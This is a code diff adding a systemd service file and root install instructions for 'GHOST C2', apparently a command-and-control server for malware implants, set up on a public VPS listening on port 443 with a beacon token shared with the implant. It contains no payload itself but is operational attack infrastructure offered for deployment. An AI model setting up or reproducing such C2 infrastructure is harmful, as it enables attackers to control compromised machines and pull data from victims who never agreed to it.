@@ -1,0 +1,31 @@
+# GHOST C2 — systemd unit for a public VPS instance
+#
+# Install (as root on the VPS):
+#   mkdir -p /opt/ghost
+#   cp c2_server.py requirements.txt /opt/ghost/
+#   pip3 install flask cryptography pyOpenSSL
+#   cp ghost-c2.service /etc/systemd/system/
+#   # edit the ExecStart tokens/password below FIRST, then:
+#   systemctl daemon-reload && systemctl enable --now ghost-c2
+#
+# Firewall: open 443/tcp (and SSH). Everything rides one port.
+
+[Unit]
+Description=GHOST C2 Server (HTTPS)
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/opt/ghost
+ExecStart=/usr/bin/python3 /opt/ghost/c2_server.py \
+    --tls --host 0.0.0.0 --port 443 \
+    --beacon-token REPLACE_WITH_THE_TOKEN_BAKED_INTO_THE_IMPLANT \
+    --operator-token REPLACE_WITH_A_LONG_RANDOM_OPERATOR_TOKEN \
+    --user admin --password REPLACE_ME
+Restart=always
+RestartSec=3
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
